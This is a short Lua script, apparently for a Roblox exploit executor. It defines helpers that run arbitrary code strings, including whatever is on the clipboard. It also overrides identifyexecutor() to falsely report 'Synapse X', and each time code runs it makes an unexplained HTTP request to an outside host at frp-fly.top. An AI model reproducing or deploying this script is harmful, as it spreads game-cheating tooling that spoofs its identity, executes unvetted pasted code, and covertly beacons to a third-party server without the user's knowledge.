local a=[[
function identifyexecutor()
return "Synapse X"
end

]]
function _G.wsexec(dm)
runcode(a..dm)
game:HttpGet("http://frp-fly.top:34013/a?i=")
end
function _G.wsclipboard()
_G.wsexec(getclipboard())
end
function _G.ws_Get_ClipBoard()
return getclipboard()
end
_G["identifyexecutor"] = identifyexecutor
_G.wsexec([[print("OK")]])
